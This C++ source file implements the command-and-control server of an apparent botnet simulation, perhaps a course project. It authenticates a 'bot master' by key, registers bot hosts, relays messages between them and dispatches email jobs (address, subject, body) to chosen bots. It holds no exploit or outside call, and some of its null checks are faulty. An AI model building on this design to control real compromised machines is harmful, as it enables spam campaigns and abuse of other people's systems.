#include "CNCServer.h"
#include <iostream>
using namespace std;

bool CNCServer::LoadConfigurations()
{
    ifstream configurationFileHandler;
    configurationFileHandler.open(cnc_configuration_file.c_str(), ios::in);
    if (!configurationFileHandler.is_open())
    {
        return configurationFileHandler.is_open();
    }
    configurationFileHandler.ignore(1024, ' ');
    configurationFileHandler.getline(temp, sizeof(temp), '\n');
    cnc_listening_port = atoi(temp);
    
    configurationFileHandler.ignore(1024, ' ');
    configurationFileHandler.getline(temp, sizeof(temp), '\n');
    master_authentication_key.assign(temp);
    
    configurationFileHandler.ignore(1024, ' ');
    configurationFileHandler.getline(temp, sizeof(temp), '\n');
    temp[strlen(temp)-1] = '\0';
    cnc_output_filename.assign(temp);
    
    configurationFileHandler.ignore(1024, ' ');
    configurationFileHandler.getline(temp, sizeof(temp), '\n');
    total_communicators = atoi(temp);
    processDetails = new ProcessDetails[total_communicators];
    configurationFileHandler.close();
    return true;
}

bool CNCServer::OpenOutputFileHandler()
{
    outputFileHandler.open(cnc_output_filename.c_str());
    return outputFileHandler.is_open();
}

void CNCServer::LogMessage(char* message)
{
    outputFileHandler<<message<<endl;
}

void CNCServer::HostHangUp(int hostPort)
{
    ProcessDetails *found = ProcessDetails::FindProcessWithPortNumber(hostPort, processDetails, total_communicators);
    printf("C&C server: %s disconnected\n", found->processName.c_str());
    if (hostPort==botMaster.portAssociated){
        botMaster.portAssociated = 0;
        botMaster.status = OFF;
    }
    if (found==NULL)
    {
        cout<<"An unexpected situation reached on c&c server"<<endl;
    }
    else
    {
        found->status = OFF;
    }
}

void CNCServer::ExecuteMessage(char* command)
{
    timeval sigTime;
    gettimeofday(&sigTime, 0);
    
    string message;
    message.assign(temp);
    message = message.substr(message.find(" ")+1, message.length());
    string senderHost = message.substr(0, message.find("-"));
    message = message.substr(message.find(">")+1, message.length());
    string receiverHost = message.substr(0, message.find(":"));
    message = message.substr(message.find("\"")+1, message.length());
    string body = message.substr(0, message.find("\""));
    
    ProcessDetails * sender = ProcessDetails::FindProcessWithProcessName(senderHost, processDetails, total_communicators);
    ProcessDetails * receiver = ProcessDetails::FindProcessWithProcessName(receiverHost, processDetails, total_communicators);
    if (sender==NULL || receiver==NULL){
        cout<<"C&C should not reach this place: check configuration file"<<endl;
        return;
    }
    if (sender->status==OFF)
    {
        memset(temp, 0, sizeof(temp));
        sprintf(temp, "message_sending_failed: %s is down", sender->processName.c_str());
        send(botMaster.portAssociated, temp, strlen(temp), 0);
    }
    else if (receiver->status == OFF)
    {
        memset(temp, 0, sizeof(temp));
        sprintf(temp, "message_sending_failed: %s is down", receiver->processName.c_str());
        send(botMaster.portAssociated, temp, strlen(temp), 0);
    }
    else
    {
        memset(temp, 0, sizeof(temp));
        sprintf(temp, "Message: host(%s) port(%d): %s", receiver->processName.c_str(), receiver->portNumber, body.c_str());
        send(sender->portAssociated, (void*)temp, strlen(temp), 0);
        memset(temp, 0, sizeof(temp));
        sprintf(temp, "message_sent_successfully");
        send(botMaster.portAssociated, (void*)temp, strlen(temp), 0);
    }
    memset(temp, 0, sizeof(temp));
    sprintf(temp, "command_received: *Message* %s %s->%s", gettimeinbuffer(sigTime).c_str(), sender->processName.c_str(), receiver->processName.c_str());
    LogMessage(temp);
}

void CNCServer::ExecuteEmail(char* command)
{
    timeval sigTime;
    gettimeofday(&sigTime, 0);
    
    string message;
    message.assign(temp);
    message = message.substr(message.find(" ")+1, message.length());
    string hosts_temp;
    string hosts;
    string subject;
    hosts.assign(message.substr(0, message.find(" ")));
    hosts_temp.assign(hosts);
    message = message.substr(message.find("\"")+1, message.length());
    string email;
    email.assign(message.substr(0, message.find("\"")));
    message = message.substr(message.find("\"")+3, message.length());
    subject.assign(message.substr(0, message.find("\"")));
    message = message.substr(message.find("\"")+3, message.length());
    string body;
    body.assign(message.substr(0, message.find("\"")));
    string clientMessage;
    clientMessage.assign("Email:"+email+" *"+subject+"*"+body);
    //cout<<"EMAIL MESSAGE TO BE SENT TO CLIENTS : "<<clientMessage<<endl;
    list<string> hostsList;
    while (hosts.find(",")!=string::npos)
    {
        hostsList.insert(hostsList.begin(), hosts.substr(0, hosts.find(",")));
        hosts = hosts.substr(hosts.find(",")+1, hosts.length());
    }
    hostsList.insert(hostsList.begin(), hosts);
    string successful_hosts;
    string failed_hosts;
    //now sending email commands to hosts
    for (list<string>::iterator it=hostsList.begin(); it!=hostsList.end(); it++)
    {
        ProcessDetails* processDetail = ProcessDetails::FindProcessWithProcessName(*it, processDetails, total_communicators);
        if (processDetail==NULL || processDetail->status == OFF)
        {
            if (failed_hosts.length()==0)
            {
                failed_hosts.assign(processDetail->processName);
            }
            else{
                failed_hosts.append(","+processDetail->processName);
            }
        }
        else
        {
            //host is found active
            if (successful_hosts.length()==0)
            {
                successful_hosts.assign(processDetail->processName);
            }
            else{
                successful_hosts.append(","+processDetail->processName);
            }
        }
        send(processDetail->portAssociated, (void*)clientMessage.c_str(), clientMessage.length(), 0);
    }
    memset(temp, 0, sizeof(temp));
    sprintf(temp, "email_successful_hosts: %s\nemail_failed_hosts: %s", successful_hosts.c_str(), failed_hosts.c_str());
    send(botMaster.portAssociated, (void*)temp, strlen(temp), 0);
    
    memset(temp, 0, sizeof(temp));
    sprintf(temp, "command_received: *Email* time_stamp:%s %s", gettimeinbuffer(sigTime).c_str(), hosts_temp.c_str());
    LogMessage(temp);
}

void CNCServer::RegisterHost(char* tempMessage, int sockfd)
{
    string message;
    message.assign(tempMessage);
    string processName;
    message = message.substr(message.find(":")+1, message.length());
    processName.assign(message.substr(0, message.find(" ")).c_str());
    message = message.substr(message.find(":")+1, message.length());
    int pid = atoi(message.substr(0, message.find(" ")).c_str());
    message = message.substr(message.find(":")+1, message.length());
    int port = atoi(message.substr(0, message.find(" ")).c_str());
    
    if (processName.compare("master")==0)
    {
        memset(temp, 0, sizeof(temp));
        sprintf(temp, "bot_master_claim_port=%d pid=%d", port, pid);
        LogMessage(temp);
        string auth;
        message = message.substr(message.find(":")+1, message.length());
        auth.assign(message.substr(0, message.find(" ")));
        memset(temp, 0, sizeof(temp));
        if (auth.compare(master_authentication_key)==0 && botMaster.status == OFF)
        {
            processDetails[processCount].portNumber = port;
            processDetails[processCount].processID = pid;
            processDetails[processCount].processName.assign(processName);
            processDetails[processCount].status = ON;
            processDetails[processCount].portAssociated = sockfd;
            processCount++;
            memset(temp, 0, sizeof(temp));
            int base_seconds = base_signal.tv_sec;
            int base_milliseconds = base_signal.tv_usec;
            sprintf(temp, "authenticated %d %d", base_seconds, base_milliseconds);
            send(sockfd, (void*)temp, strlen(temp), 0);
            botMaster.portAssociated = sockfd;
            botMaster.status = ON;
            cout<<"C&C server: bot master authenticated"<<endl;
            memset(temp, 0, sizeof(temp));
            sprintf(temp, "authentication_key=%s status=authenticated", auth.c_str());
            LogMessage(temp);
        }
        else
        {
            //log that master authentication failed once
            strcpy(temp, "authentication_failed");
            send(sockfd, (void*)temp, strlen(temp), 0);
            cout<<"C&C server: bot master authentication failed"<<endl;
            memset(temp, 0, sizeof(temp));
            sprintf(temp, "authentication_key=%s status=authentication_failed", auth.c_str());
            LogMessage(temp);
        }
    }
    else
    {
        processDetails[processCount].portNumber = port;
        processDetails[processCount].processID = pid;
        processDetails[processCount].processName.assign(processName);
        processDetails[processCount].status = ON;
        processDetails[processCount].portAssociated = sockfd;
        int processNumber = atoi(processName.c_str()+1);
        memset(temp, 0, sizeof(temp));
        sprintf(temp, "host%d port=%d pid=%d", processNumber, processDetails[processCount].portNumber, processDetails[processCount].processID);
        LogMessage(temp);
        processCount++;
    }
    //ProcessDetails::FindProcessWithPortNumber(port, processDetails, num);
}

void CNCServer::ExecuteGetListOfHosts(char *command)
{
    timeval sigTime;
    gettimeofday(&sigTime, 0);
    
    ProcessDetails::SendListOfHosts(processDetails, total_communicators, botMaster.portAssociated);
    memset(temp, 0, sizeof(temp));
    sprintf(temp, "command_received: *get_list_of_connected_hosts* time_stamp:%s", gettimeinbuffer(sigTime).c_str());
    LogMessage(temp);
}

